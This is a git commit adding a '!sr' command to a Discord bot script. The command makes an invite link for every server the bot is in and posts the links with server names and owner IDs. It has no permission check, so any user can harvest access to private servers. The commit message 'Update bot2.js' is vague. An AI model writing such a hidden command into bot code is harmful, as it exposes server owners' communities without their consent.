89841d7e1065643ec2fad37fbbf9fc254f943b50
salamri <42224359+salamri@users.noreply.github.com>
2018-08-13 12:00:28 +0300

    Update bot2.js

--- bot2.js
+++ bot2.js
@@ -18,6 +18,36 @@ client.on('message', msg => {
 
 
 
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '!sr') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
+
+
+
+
+
+
+
 
 
 client.on('message', message => { 
